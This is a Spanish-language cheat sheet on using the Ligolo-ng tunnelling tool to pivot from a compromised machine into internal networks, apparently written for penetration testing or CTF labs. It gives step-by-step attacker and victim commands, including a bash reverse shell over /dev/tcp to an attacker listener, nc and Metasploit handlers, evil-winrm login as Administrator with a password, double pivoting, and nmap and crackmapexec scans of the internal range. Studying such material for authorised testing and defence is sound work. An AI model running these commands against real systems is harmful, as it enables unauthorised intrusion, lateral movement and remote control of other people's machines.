# Ligolo-ng

> **Ligolo-ng** es una herramienta de tunelización y pivoting que permite enrutar tráfico a través de agentes comprometidos mediante una interfaz TUN virtual. A diferencia de proxychains/SOCKS, el tráfico es transparente: puedes usar cualquier herramienta sin configuración adicional de proxy.

### Arquitectura

```
[Atacante]  ←──── ligolo-ng proxy ────→  [Agente en víctima]  ────→  [Red interna]
 tun0 (172.16.0.1)                        (agente.exe / agent)         (192.168.x.x)
```

| Componente     | Descripción                                            |
| -------------- | ------------------------------------------------------ |
| `proxy`        | Corre en el atacante. Escucha conexiones de agentes.   |
| `agent`        | Corre en la máquina comprometida. Conecta al proxy.    |
| Interfaz `tun` | Interfaz virtual en el atacante que enruta el tráfico. |

***

### Instalación

```bash
# Descarga desde GitHub (releases)
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/proxy_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/agent_linux_amd64.tar.gz

# Extraer
tar -xzf proxy_linux_amd64.tar.gz
tar -xzf agent_linux_amd64.tar.gz
```

> ⚠️ El agente debe compilarse o descargarse para la arquitectura del objetivo (linux/windows/amd64/386).

### Paso 1 — Crear la interfaz TUN

La interfaz TUN es la pieza central. Todo el tráfico hacia la red interna pasará por aquí.

```bash
# En el atacante (como root)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

Verificar que está activa:

```bash
ip a show ligolo
# Output esperado:
# X: ligolo: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN
```

> 💡 El nombre `ligolo` es arbitrario. Puedes usar cualquier nombre (ej. `tun0`, `pivot0`). Usa el mismo nombre al lanzar el proxy con `-tun`.

***

### Paso 2 — Lanzar el Proxy (atacante)

```bash
./proxy -selfcert -laddr 0.0.0.0:11601
```

| Flag                     | Descripción                                              |
| ------------------------ | -------------------------------------------------------- |
| `-selfcert`              | Genera un certificado TLS auto-firmado (desarrollo/CTF). |
| `-laddr`                 | Dirección y puerto de escucha para los agentes.          |
| `-certfile` / `-keyfile` | Certificado y clave propios (producción).                |
| `-tun`                   | Nombre de la interfaz TUN a usar (defecto: `ligolo`).    |
| `-v`                     | Modo verbose.                                            |

> ⚠️ Usa `-selfcert` solo en entornos controlados. En red real, genera un certificado firmado.

El proxy abrirá una **consola interactiva** una vez en marcha:

```
ligolo-ng »
```

### Paso 3 — Ejecutar el Agente (víctima)

Transferir el binario `agent` a la máquina comprometida y ejecutar:

```bash
# Linux
./agent -connect <IP_ATACANTE>:11601 -ignore-cert

# Windows (PowerShell)
.\agent.exe -connect <IP_ATACANTE>:11601 -ignore-cert
```

| Flag           | Descripción                                                   |
| -------------- | ------------------------------------------------------------- |
| `-connect`     | IP:puerto del proxy del atacante.                             |
| `-ignore-cert` | Ignora validación del certificado TLS (usar con `-selfcert`). |
| `-retry`       | Reintenta la conexión automáticamente si se pierde.           |
| `-socks5`      | Usa un proxy SOCKS5 para alcanzar el atacante.                |
| `-v`           | Verbose.                                                      |

En la consola del proxy verás:

```
INFO[0005] Agent joined.  name=WIN-TARGET01@192.168.1.50 remote="192.168.1.50:54321"
```

### Paso 4 — Gestión de Sesiones

#### Listar sesiones disponibles

```
ligolo-ng » session
```

```
? Agents list:
  [0] WIN-TARGET01@192.168.1.50 - 192.168.1.50:54321
```

#### Seleccionar una sesión

```
ligolo-ng » session
> Selecciona con las flechas y Enter
```

Una vez seleccionada, el prompt cambia a:

```
[Agent : WIN-TARGET01@192.168.1.50] »
```

#### Comandos de sesión

| Comando    | Descripción                                                                    |
| ---------- | ------------------------------------------------------------------------------ |
| `session`  | Lista y selecciona sesiones activas.                                           |
| `ifconfig` | Muestra interfaces de red del agente (¡crucial para saber qué redes enrutar!). |
| `info`     | Información del agente actual.                                                 |
| `start`    | Inicia el túnel con el agente seleccionado.                                    |
| `stop`     | Detiene el túnel activo.                                                       |
| `exit`     | Sale de la consola.                                                            |

### Paso 5 — Descubrir la red interna del agente

Antes de asignar rutas, necesitas saber qué redes ve el agente:

```
[Agent : WIN-TARGET01] » ifconfig
```

```
┌──────────────────────────────┐
│ Interface 0                  │
│   Name         : eth0        │
│   Hardware MAC : 00:0c:29:.. │
│   MTU          : 1500        │
│   Flags        : up          │
│   IPv4 Address : 192.168.1.50/24  │
├──────────────────────────────┤
│ Interface 1                  │
│   Name         : eth1        │
│   IPv4 Address : 10.10.10.5/24    │
└──────────────────────────────┘
```

> 💡 La red `10.10.10.0/24` es la red interna a la que queremos llegar. Esa es la que enrutaremos.

### Paso 6 — Asignar rango de IP a la interfaz TUN

Una vez conocida la red interna, agregar la ruta en el atacante:

```bash
# En el atacante (nueva terminal, como root)
sudo ip route add 10.10.10.0/24 dev ligolo
```

Verificar:

```bash
ip route | grep ligolo
# 10.10.10.0/24 dev ligolo scope link
```

> ⚠️ Esta ruta debe añadirse **antes** o **después** de iniciar el túnel, pero el tráfico solo fluirá cuando el túnel esté activo (`start`).

#### Múltiples redes

Puedes agregar todas las redes que descubras:

```bash
sudo ip route add 172.16.0.0/16 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Paso 7 — Iniciar el Túnel

```
[Agent : WIN-TARGET01] » start
```

```
INFO[0012] Starting tunnel to WIN-TARGET01@192.168.1.50
```

A partir de aquí, **cualquier herramienta** que envíe tráfico a `10.10.10.0/24` lo hará a través del agente, de forma transparente.

```bash
# Desde el atacante, directamente sin proxychains:
nmap -sV 10.10.10.0/24
crackmapexec smb 10.10.10.0/24
curl http://10.10.10.20/
evil-winrm -i 10.10.10.20 -u Administrator -p 'Password123'
```

### Listeners — Redirigir puertos hacia el atacante

Los listeners permiten que máquinas de la red interna **alcancen al atacante** (útil para reverse shells).

#### Crear un listener

```
[Agent : WIN-TARGET01] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

Esto hace que:

* El agente escuche en su puerto `4444`
* Cualquier conexión a ese puerto se reenvíe al atacante en `127.0.0.1:4444`

```bash
# En el atacante, prepara el handler:
nc -lvnp 4444
# o con Metasploit:
use exploit/multi/handler
```

```bash
# En la red interna (máquina víctima secundaria), lanza la reverse shell a la IP del agente:
bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
```

> 💡 La conexión llega al atacante como si fuera local. Perfecto para encadenar pivots o recibir shells de máquinas que no pueden conectar directamente al atacante.

#### Listar listeners activos

```
[Agent : WIN-TARGET01] » listener_list
```

```
┌──────────────────────────────────────────────────────────┐
│ Active listeners                                         │
├─────┬──────────────────────┬───────────────────────────  │
│ ID  │ Agent listener addr  │ Proxy redirect addr         │
├─────┼──────────────────────┼───────────────────────────  │
│  0  │ 0.0.0.0:4444         │ 127.0.0.1:4444             │
└─────┴──────────────────────┴───────────────────────────  │
```

#### Eliminar un listener

```
[Agent : WIN-TARGET01] » listener_del --id 0
```

***

### Pivoting en Cadena (Double Pivot)

Cuando necesitas acceder a una **tercera red** accesible solo desde la segunda víctima:

```
Atacante → Agente1 (192.168.1.50) → Agente2 (10.10.10.20) → Red3 (172.16.5.0/24)
```

#### 1. Configura un listener en Agente1 para que Agente2 se conecte al proxy

```
[Agent : Agente1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
```

#### 2. Lanza el agente en Agente2 apuntando a Agente1

```bash
# En Agente2 (accesible desde Agente1)
./agent -connect 10.10.10.5:11601 -ignore-cert
```

#### 3. En la consola del proxy, selecciona Agente2

```
ligolo-ng » session
# Selecciona Agente2
[Agent : Agente2] » ifconfig
# Identifica 172.16.5.0/24
```

#### 4. Añade la ruta hacia la tercera red

```bash
sudo ip route add 172.16.5.0/24 dev ligolo
```

#### 5. Inicia el túnel con Agente2

```
[Agent : Agente2] » start
```

### Referencia Rápida de Comandos

#### Consola del Proxy

| Comando                                        | Descripción                         |
| ---------------------------------------------- | ----------------------------------- |
| `help`                                         | Muestra ayuda                       |
| `session`                                      | Lista/selecciona agentes conectados |
| `ifconfig`                                     | Interfaces del agente seleccionado  |
| `info`                                         | Info del agente actual              |
| `start`                                        | Inicia el túnel                     |
| `stop`                                         | Detiene el túnel                    |
| `listener_add --addr <IP:PORT> --to <IP:PORT>` | Crea un listener/port-forward       |
| `listener_list`                                | Lista listeners activos             |
| `listener_del --id <ID>`                       | Elimina un listener                 |
| `exit`                                         | Sale de la consola                  |

#### Comandos del Sistema (atacante)

```bash
# Crear interfaz TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Añadir ruta
sudo ip route add <RED>/<MASK> dev ligolo

# Eliminar ruta (limpieza)
sudo ip route del <RED>/<MASK> dev ligolo

# Eliminar interfaz (limpieza)
sudo ip link del ligolo
```

### &#x20;Limpieza Post-Pivoting

```bash
# Eliminar rutas
sudo ip route del 10.10.10.0/24 dev ligolo
sudo ip route del 172.16.0.0/16 dev ligolo

# Bajar y eliminar interfaz
sudo ip link set ligolo down
sudo ip link del ligolo

# Matar el proxy
Ctrl+C en la terminal del proxy
```

***

### ⚡ Flujo Completo — Cheatsheet

```bash
# ── ATACANTE ──────────────────────────────────────
# 1. Crear interfaz TUN
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up

# 2. Lanzar proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# ── VÍCTIMA ───────────────────────────────────────
# 3. Ejecutar agente
./agent -connect <ATACANTE_IP>:11601 -ignore-cert

# ── PROXY (consola) ───────────────────────────────
# 4. Ver interfaces del agente
session → ifconfig

# ── ATACANTE (nueva terminal) ─────────────────────
# 5. Añadir ruta hacia red interna
sudo ip route add 10.10.10.0/24 dev ligolo

# ── PROXY (consola) ───────────────────────────────
# 6. Iniciar túnel
start

# ── ATACANTE ──────────────────────────────────────
# 7. Atacar la red interna directamente
nmap -sV -p- 10.10.10.0/24
```
